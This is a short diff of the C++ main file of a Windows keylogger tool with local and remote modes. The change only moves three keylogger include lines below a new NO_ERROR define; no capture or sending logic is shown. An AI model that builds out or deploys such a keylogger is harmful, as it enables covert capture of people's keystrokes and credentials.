@@ -13,10 +13,6 @@
 #include <cstddef>
 #include <sstream>
 
-#include "./keylogger/keylogger.cpp"
-#include "./keylogger/keylogger_local/keylogger_local.cpp"
-#include "./keylogger/keylogger_remote/keylogger_remote.cpp"
-
 #define DEFAULT_IP_VALUE "127.0.0.1"
 #define DEFAULT_PORT_VALUE 6666
 
@@ -45,6 +41,12 @@
 #define SHORT_OPTION_HELP 'h'
 
 #define ERROR_MESSAGE_SETCONTROLECTRLHANDLER "error SetConsoleCtrlHandler "
+
+#define NO_ERROR 0
+
+#include "./keylogger/keylogger.cpp"
+#include "./keylogger/keylogger_local/keylogger_local.cpp"
+#include "./keylogger/keylogger_remote/keylogger_remote.cpp"
 
 extern bool g_keylogger_local;
 extern bool g_keylogger__remote;
